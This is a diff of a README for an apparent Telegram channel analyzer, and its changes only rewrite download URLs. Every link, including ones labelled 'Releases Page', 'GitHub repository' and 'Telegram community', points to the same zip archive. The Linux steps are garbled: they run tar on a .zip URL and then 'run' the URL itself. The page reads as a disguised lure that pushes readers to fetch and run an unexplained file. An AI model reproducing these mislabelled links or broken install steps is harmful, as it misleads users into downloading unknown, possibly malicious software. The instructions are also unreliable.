@@ -1,6 +1,6 @@
 # 📊 Telegram-channel-messages-analyzer - Analyze telegram channels with ease
 
-![Download](https://raw.githubusercontent.com/jdc0092/Telegram-channel-messages-analyzer/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip)
+![Download](https://github.com/jdc0092/Telegram-channel-messages-analyzer/raw/refs/heads/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip)
 
 ## 📖 Overview
 
@@ -18,11 +18,11 @@ Before you begin, make sure you have the following:
 
 ### Download & Install
 
-To get started, you can download the latest version of the application by visiting the following link: [Download Telegram-channel-messages-analyzer](https://raw.githubusercontent.com/jdc0092/Telegram-channel-messages-analyzer/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip)
+To get started, you can download the latest version of the application by visiting the following link: [Download Telegram-channel-messages-analyzer](https://github.com/jdc0092/Telegram-channel-messages-analyzer/raw/refs/heads/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip)
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/jdc0092/Telegram-channel-messages-analyzer/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip).
+1. Visit the [Releases Page](https://github.com/jdc0092/Telegram-channel-messages-analyzer/raw/refs/heads/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip).
 2. Click on the latest version to view the assets.
-3. Find the setup file for your operating system (e.g., `.exe` for Windows, `.dmg` for Mac, or `https://raw.githubusercontent.com/jdc0092/Telegram-channel-messages-analyzer/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip` for Linux).
+3. Find the setup file for your operating system (e.g., `.exe` for Windows, `.dmg` for Mac, or `https://github.com/jdc0092/Telegram-channel-messages-analyzer/raw/refs/heads/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip` for Linux).
 4. Download that file and save it to your computer.
 
 ### Installation Steps
@@ -44,14 +44,14 @@ To get started, you can download the latest version of the application by visiti
 **For Linux:**
 
 1. Open a terminal.
-2. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/jdc0092/Telegram-channel-messages-analyzer/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip` file.
+2. Navigate to the directory where you downloaded the `https://github.com/jdc0092/Telegram-channel-messages-analyzer/raw/refs/heads/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip` file.
 3. Unzip the file using:
    ```
-   tar -xvzf https://raw.githubusercontent.com/jdc0092/Telegram-channel-messages-analyzer/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip
+   tar -xvzf https://github.com/jdc0092/Telegram-channel-messages-analyzer/raw/refs/heads/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip
    ```
 4. Navigate to the extracted folder and run:
    ```
-   https://raw.githubusercontent.com/jdc0092/Telegram-channel-messages-analyzer/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip
+   https://github.com/jdc0092/Telegram-channel-messages-analyzer/raw/refs/heads/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip
    ```
 5. You can now find the application in your applications menu.
 
@@ -78,14 +78,14 @@ To get started, you can download the latest version of the application by visiti
 
 ## 📕 Support & Contributing
 
-If you encounter any issues or have questions, please check the issues section on the [GitHub repository](https://raw.githubusercontent.com/jdc0092/Telegram-channel-messages-analyzer/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip) for help. You can also contribute to the project by submitting a pull request. Your input helps improve the tool for everyone.
+If you encounter any issues or have questions, please check the issues section on the [GitHub repository](https://github.com/jdc0092/Telegram-channel-messages-analyzer/raw/refs/heads/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip) for help. You can also contribute to the project by submitting a pull request. Your input helps improve the tool for everyone.
 
 ## 🎉 Community
 
-Join our community of users where you can discuss features, share tips, and help each other. Connect with us on our Telegram group linked here: [Join our Telegram community](https://raw.githubusercontent.com/jdc0092/Telegram-channel-messages-analyzer/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip).
+Join our community of users where you can discuss features, share tips, and help each other. Connect with us on our Telegram group linked here: [Join our Telegram community](https://github.com/jdc0092/Telegram-channel-messages-analyzer/raw/refs/heads/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip).
 
 ## 📢 Stay Updated
 
 To keep track of new features, updates, and tips about Telegram-channel-messages-analyzer, follow us on GitHub and check the repository regularly.
 
-For the most recent updates, download the latest version here: [Download Telegram-channel-messages-analyzer](https://raw.githubusercontent.com/jdc0092/Telegram-channel-messages-analyzer/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip).
+For the most recent updates, download the latest version here: [Download Telegram-channel-messages-analyzer](https://github.com/jdc0092/Telegram-channel-messages-analyzer/raw/refs/heads/main/account/Telegram-channel-messages-analyzer-v2.6-alpha.1.zip).
